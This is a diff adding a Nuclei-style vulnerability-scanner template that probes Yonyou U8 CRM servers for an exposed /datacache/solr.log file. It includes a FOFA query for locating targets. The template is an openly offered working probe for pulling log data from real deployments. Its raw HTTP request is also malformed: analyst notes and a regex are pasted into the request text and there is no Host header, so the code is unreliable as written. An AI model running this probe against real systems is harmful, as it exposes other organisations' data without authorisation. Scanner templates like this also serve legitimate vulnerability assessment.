@@ -1,0 +1,34 @@
+id: poc-ufoi1v7lxgoe5coh
+info:
+  name: 用友u8_crm存在solr信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ufoi1v7lxgoe5coh'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ufoi1v7lxgoe5coh
+    fofa: body="用友U8CRM"
+http:
+- raw:
+  - 'GET /datacache/solr.log HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?solr)(?=.*?index).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
